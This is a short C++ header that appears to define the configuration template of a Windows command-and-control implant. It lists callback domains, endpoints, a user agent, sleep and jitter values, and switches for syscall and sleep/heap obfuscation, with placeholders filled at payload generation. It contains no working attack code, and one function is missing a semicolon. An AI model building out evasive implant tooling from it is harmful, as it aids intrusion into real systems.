#pragma once
#include <windows.h>

#define MAX_DOMAIN_COUNT REPLACE_COUNT_MARKER // todo, computer and update this at payload generation

typedef struct _DomainEntry {
	WCHAR domain[REPLACE_LEN_MARKER];
	UINT  port;
	BOOL isHttps;
	BOOL isDead;
	BOOL isSecondChance;
}DomainEntry;



struct Config {
	DomainEntry domains[MAX_DOMAIN_COUNT];
	size_t domaincounts;

	// also calcuate these 3 below at generation time
	WCHAR GetEndpoint[REPLACE_GET_MARKER];
	WCHAR PostEndpoint[REPLACE_POST_MARKER];
	WCHAR UA[REPLACE_UA_MARKER];



	UINT Sleep;
	UINT Jitter;
	UINT SyscallType; // 0 = no syscalls | 1 = direct | 2 = indirect
	UINT UseHeapObf; //  0 = no | 1 = yes
	UINT SleepObf;   //   0 = no | 1 = yes
};


inline PBYTE GetProfile() {
	return (PBYTE)"REPLACE_PROFILE_DATA_MARKER"
}


inline UINT GetProfileSize() {
	return REPLACE_PROF_LEN_MARKER;
}


BOOL LoadConfig();
extern Config* conf;